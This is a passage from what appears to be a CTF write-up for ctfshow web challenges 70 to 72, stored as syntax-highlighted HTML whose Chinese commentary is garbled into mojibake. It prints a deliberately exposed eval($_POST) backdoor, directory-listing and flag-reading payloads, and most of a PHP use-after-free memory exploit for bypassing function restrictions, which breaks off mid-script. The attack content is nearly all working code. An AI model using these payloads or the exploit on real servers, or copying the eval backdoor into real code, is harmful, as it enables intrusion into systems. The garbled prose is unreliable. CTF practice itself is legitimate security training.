important\">&lt;?php</span>\n<span class=\"token comment\">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>emmmm æ²¡çœ‹åˆ°åŠ äº†å•¥ï¼Œæˆ‘éƒ½ä»¥ä¸ºæˆ‘å¼€é”™ç¯å¢ƒäº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031163958688.png\" alt=\"image-20221031163958688\" /></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">// é€šè¿‡å¤åˆ¶ï¼Œé‡å‘½åè¯»å–ä½¿å¾—æ–‡ä»¶ä¸èƒ½è¢«å½“ä½œ php è§£æ</span>\n<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// ç”¨æ³•ï¼š</span>\n<span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          \n<span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"flag.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"web71\"><a class=\"anchor\" href=\"#web71\">#</a> web71</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[0-9]|[a-z]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"?\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ä½¿ç”¨ ob_get_contents ()ï¼Œob_end_clean (); å‡½æ•°å°†å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾ï¼Œè¿™é‡Œä¹Ÿç®€å•ï¼Œä½¿ç”¨ exit () å°†åé¢çš„éƒ¨åˆ†ç»“æŸå°±è¡Œã€‚</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c<span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// åˆ©ç”¨åŸç”Ÿç±»</span>\nc<span class=\"token operator\">=</span><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031182645648.png\" alt=\"image-20221031182645648\" /></p>\n<h2 id=\"web72\"><a class=\"anchor\" href=\"#web72\">#</a> web72</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">c=?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121152127.png\" alt=\"image-20221101121152127\" /></p>\n<p>çœ‹åˆ° flag åœ¨ /flag0.txtï¼Œè¯»æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121324824.png\" alt=\"image-20221101121324824\" /></p>\n<p>ä½¿ç”¨ uaf è„šæœ¬ç»•è¿‡</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$v</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n\n                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token 